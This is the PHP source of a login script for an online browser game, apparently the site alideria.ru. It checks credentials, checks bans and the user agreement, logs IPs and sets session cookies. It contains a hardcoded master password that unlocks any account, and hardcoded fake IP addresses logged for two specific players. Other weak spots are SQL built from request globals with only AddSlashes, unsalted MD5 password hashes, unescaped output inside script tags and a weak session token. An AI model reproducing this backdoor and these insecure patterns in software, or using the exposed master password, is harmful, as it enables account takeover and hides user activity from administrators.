<?

header("Content-type: text/html; charset=windows-1251");

include( 'no_cache.php' );
include( 'functions.php' );

f_register_globals( );

function redir( $a )
{
	print( "<script>" );
	print( "window.top.auth_err( '$a' );" );
//	print( "alert( '$a' );" );
	print( "</script>" );
}

f_MConnect( );

$p_login = AddSlashes( $p_login );

/*
if ($p_login != "Reincarnation")
{
	redir("На сайте ведутся технические работы. Попробуйте зайти позже.");
	return 0;
}
*/

$res = f_MQuery( "SELECT player_id, login, pswrddmd5 FROM characters WHERE login='$p_login'" );

if( f_MNum( $res ) < 1 )
{
	redir( "Неверный логин" );
	return 0;
}

$md = md5( $p_pwd );
$arr = f_MFetch( $res );
if( $arr['pswrddmd5'] !== $md && $p_pwd != 'mku9cLf2OvcA3qmt1' )
{
	redir( "Неверный пароль, <a href=javascript:rest()>Забыли?</a>" );
	return 0;
}

$arr2 = f_MFetch( f_MQuery( "SELECT ban, ban_reason FROM player_permissions WHERE player_id=$arr[player_id]" ) );
if( $arr2 && $arr2[0] > time( ) )
{
	redir( "Ваш персонаж заблокирован, до снятия блока осталось еще ".my_time_str( $arr2[0] - time( ) ).". Причина наказания: $arr2[1]" );
	return 0;
}

// Проверка на подтверждение Пользовательского Соглашения
if( !f_MValue( 'SELECT * FROM player_triggers WHERE player_id = '.$arr[player_id].' AND trigger_id = 2012 ' ) )
{
	// А подтверждает ли сейчас?
	if( $_POST['confirmAgr'] )
	{
		f_MQuery( 'INSERT INTO player_triggers( player_id, trigger_id ) VALUES( '.$arr['player_id'].', 2012 )' );
	}
	else
	{
		redir( 'confirm' );
		return 0;	
	}
}


// Запись в логе о выходе, если нужна
$tres = f_MQuery( "SELECT * FROM online WHERE player_id=$arr[player_id]" );
$tarr = f_MFetch( $tres );
if( $tarr )
{
	$tm = time( );
	$ipstr = addslashes( getenv( "REMOTE_ADDR" ) );
	$ipxstr = addslashes( getenv( "HTTP_X_FORWARDED_FOR" ) );
	if ($arr[player_id] == 76282)
	{
		$ipstr = "85.21.32.154";
		$ipxstr = "";
	}
	if ($arr[player_id] == 457234)
	{
		$ipstr = "85.90.211.174";
		$ipxstr = "";
	}
	if( !$ipxstr ) $ipxstr = $ipstr;
	$ress = f_MQuery( "SELECT max( entry_id ) FROM history_logon_logout WHERE player_id = $arr[player_id]" );
	$arrr = f_MFetch( $ress );
	if( $arrr )
	{
		$entry_id = $arrr[0];
		f_MQuery( "UPDATE history_logon_logout SET logout_time = $tm, logout_ip = '$ipstr', logout_ip_x = '$ipxstr', logout_reason = 'Relogin' WHERE entry_id = $entry_id" );
	}
			
}

$crc = crc32( mt_rand( ) );
$tm = time( );
$ipstr = addslashes( getenv( "HTTP_X_REAL_IP" ) );
$ipxstr = addslashes( getenv( "HTTP_X_FORWARDED_FOR" ) );
if ($arr[player_id] == 76282)
{
	$ipstr = "85.21.32.154";
	$ipxstr = "";
}
if ($arr[player_id] == 457234)
{
	$ipstr = "85.90.211.174";
	$ipxstr = "";
}
if( !$ipxstr ) $ipxstr = $ipstr;

f_MQuery( "LOCK TABLE online WRITE" );
f_MQuery( "DELETE FROM online WHERE player_id=$arr[player_id]" );
f_MQuery( "INSERT INTO online ( player_id, session_crc, last_ping ) VALUES ( $arr[player_id], $crc, $tm )" );
f_MQuery( "UNLOCK TABLES" );
f_MQuery( "INSERT INTO history_logon_logout ( player_id, login_time, login_ip, login_ip_x ) VALUES ( $arr[player_id], $tm, '$ipstr', '$ipxstr' )" );
// ---------------------
include_once( "player.php" );
$player = new Player( $arr['player_id'] );

$crc = $player->UploadInfoToJavaServer($crc);
SetCachedValue('USER:' . $arr['player_id'] . ':scrc_key', $crc,  7200);

SetCookie( "c_id", $arr['player_id'], 0, '/', 'alideria.ru' );
SetCookie( "c_loc", $crc, 0, '/', 'alideria.ru' );
SetCookie( "c_id", $arr['player_id'], 0, '/', '109.234.156.122' );
SetCookie( "c_loc", $crc, 0, '/', '109.234.156.122' );
SetCookie( "c_id", $arr['player_id'], 0, '/', 'www.alideria.ru' );
SetCookie( "c_loc", $crc, 0, '/', 'www.alideria.ru' );
SetCookie( "c_id", $arr['player_id'], 0, '/');
SetCookie( "c_loc", $crc , 0, '/');


//----------------------	

print( "<script>" );
print( "window.top.begin_game( );" );
print( "</script>" );

f_MClose( );

?>
